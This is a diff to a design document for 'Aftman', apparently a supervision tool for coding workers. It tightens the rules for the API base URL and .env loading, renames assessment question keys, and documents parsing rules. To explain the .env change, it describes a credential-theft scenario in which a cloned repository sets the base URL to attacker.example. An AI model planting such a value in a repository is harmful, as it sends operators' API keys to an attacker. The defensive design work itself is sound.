@@ -31,6 +31,12 @@ Provider selection is by base URL only. That is the whole of "or an equivalent m
 
 Set the matching key and URL together. Never include `/v1` or the full endpoint in the base URL.
 
+**The base URL must be `https://…` or loopback.** Aftman refuses to start with a cleartext
+non-loopback base URL, because the very next request would put `Authorization: Bearer
+<TYPESAFE_API_KEY>` on the wire in the clear. `http://127.0.0.1:…` and `http://localhost:…` are
+allowed for a local proxy. `aftman doctor` prints the resolved base URL scheme and host, so an
+unexpected redirect is visible before the first assessment rather than after the first bill.
+
 **Headers sent:**
 
 ```http
@@ -52,15 +58,15 @@ X-TypeSafe-Retry-Count: <n>          # present only on retries
   "state": { /* string | object | array */ },
   "model": "jev-latest",
   "questions": {
-    "core.completion.implementation_complete": {
+    "core.completion__implementation_complete": {
       "type": "noul",
       "instructions": "The repository now contains the complete implementation the job asked for."
     },
-    "core.completion.ready_to_finish": {
+    "core.completion__ready_to_finish": {
       "type": "noul",
       "instructions": { "question": "Is the job finished?", "context": "..." }
     },
-    "core.verification.next_step": {
+    "core.verification__next_step": {
       "type": "choice",
       "instructions": "What should supervision do next?",
       "criteria": {
@@ -69,7 +75,7 @@ X-TypeSafe-Retry-Count: <n>          # present only on retries
         "stop":     "The worker is not advancing the job; stop it."
       }
     },
-    "core.worker-health.progress_level": {
+    "core.worker-health__progress_level": {
       "type": "score",
       "instructions": "How much meaningful progress has the active worker made?",
       "criteria": ["None", "Some", "Most", "Essentially all"]
@@ -98,12 +104,12 @@ rubric without turning it into prose.
   "model": "jev-2025-xx-xx",
   "usage": { "input_tokens": 8123, "output_tokens": 96 },
   "answers": {
-    "core.completion.implementation_complete": { "type": "noul",   "noul": 0.91 },
-    "core.verification.next_step": {
+    "core.completion__implementation_complete": { "type": "noul",   "noul": 0.91 },
+    "core.verification__next_step": {
       "type": "choice", "choice": "verify", "confidence": 0.77,
       "probabilities": { "continue": 0.12, "verify": 0.77, "stop": 0.11 }
     },
-    "core.worker-health.progress_level": {
+    "core.worker-health__progress_level": {
       "type": "score", "score": 2.4, "confidence": 0.81,
       "legend": { "0": "None", "1": "Some", "2": "Most", "3": "Essentially all" },
       "probabilities": { "0": 0.03, "1": 0.11, "2": 0.46, "3": 0.40 }
@@ -122,6 +128,14 @@ Parsing rules (all in `aftman-jev::wire`):
 - a non-finite or out-of-range `noul` is a `ModelError::InvalidAnswer` (a tiny float overshoot
   past `1.0` is clamped, with a `warn`);
 - a `choice` whose selection is not in the requested criteria is a `ModelError::InvalidAnswer`;
+- **`ScoreAnswer.probabilities` and `.legend` arrive with *string* keys**
+  (`{"0": 0.03, "1": 0.11}`). The wire type uses `BTreeMap<String, f32>`; `aftman-jev` converts
+  to `BTreeMap<u32, f32>` and raises `ModelError::InvalidAnswer` on a non-numeric key. Do not try
+  to deserialize directly into `BTreeMap<u32, _>` — `serde_json` rejects it with
+  `invalid type: string "0", expected u32`;
+- `score` is a float (the probability-weighted mean of the levels). `level` is **derived** by
+  `aftman-jev` as the argmax of `probabilities`, is never sent by the provider, and is `None` when
+  the keys do not parse;
 - `usage` is recorded even when parsing later fails, if the body was readable.
 
 `model` in the response may differ from the request (aliases resolve). Persist **the reported
@@ -159,7 +173,7 @@ Error body message extraction follows the provider's shapes in order: `error` (s
 **On any model error the runtime does not guess.** It records the failure and applies
 `PolicyInput` with an empty assessment, which by construction can only produce a conservative
 directive (`Continue` if the worker is still running and the budget allows, otherwise
-`EscalateHuman`). See [05-responsibilities.md §6](05-responsibilities.md).
+`Escalate`). See [05-responsibilities.md §6](05-responsibilities.md).
 
 ## 5. Grouping and parallelism
 
@@ -199,7 +213,7 @@ Compaction is deterministic and ordered, and it records every action it takes:
    `"…[truncated N bytes]…"` so a model is never shown a silently clipped fact.
 3. Never drop: the job prompt, the current status, the active worker's tail, the prior decision,
    or `counters`. If those alone exceed the budget the request is refused
-   (`ModelError::BudgetExceeded`) and becomes an `EscalateHuman`, because supervising with the
+   (`ModelError::BudgetExceeded`) and becomes an `Escalate`, because supervising with the
    job removed is meaningless.
 4. Target sizes (`pair_target_bytes`, `request_target_bytes`) are hysteresis: once compaction
    starts it continues down to the target, so consecutive cycles do not oscillate between
@@ -282,8 +296,17 @@ Implementations:
 2. Never send the API key anywhere except the configured base URL. No telemetry, no proxying, no
    fallback endpoints.
 3. Keep the upstream env var names (`TYPESAFE_*`) so existing setups and `.env` files work.
-4. `.env` loading order: `<repo>/.env` (non-overriding) then `$XDG_CONFIG_HOME/aftman/.env`
-   (non-overriding), then the real environment wins.
+4. `.env` loading order, non-overriding, real environment always wins:
+   1. `$XDG_CONFIG_HOME/aftman/.env`;
+   2. the process environment.
+
+   **`<repo>/.env` is never loaded into the supervisor process.** An earlier revision loaded it
+   first, mirroring upstream. That is a credential-exfiltration vector: a cloned repository that
+   ships `TYPESAFE_BASE_URL=https://attacker.example` would have its base URL picked up whenever
+   the operator had set `TYPESAFE_API_KEY` but not an explicit base URL, and the very next request
+   would send the key to the attacker. Repository-supplied `.env` files may be passed to the
+   *worker* environment as ordinary variables; they may not reach supervisor configuration. See
+   [08-security.md §2.1](08-security.md).
 5. Persist the *reported* model, keep the *requested* model alongside it.
 6. Tolerate additive API change (ignore), never tolerate subtractive change silently (missing
    requested answers are fatal).
@@ -298,4 +321,4 @@ Implementations:
 | Model unreachable mid-run | Event + UI banner; supervision degrades | Conservative directives only; escalates rather than guessing |
 | Repeated 429 | Backoff event, longer assessment interval | Slows supervision, keeps the worker running |
 | Malformed answer | `ModelError` event with body excerpt | No directive from that answer; conservative fallback |
-| Budget exceeded on required evidence | `BudgetExceeded` event | `EscalateHuman` with the compaction plan attached |
+| Budget exceeded on required evidence | `BudgetExceeded` event | `Escalate` with the compaction plan attached |
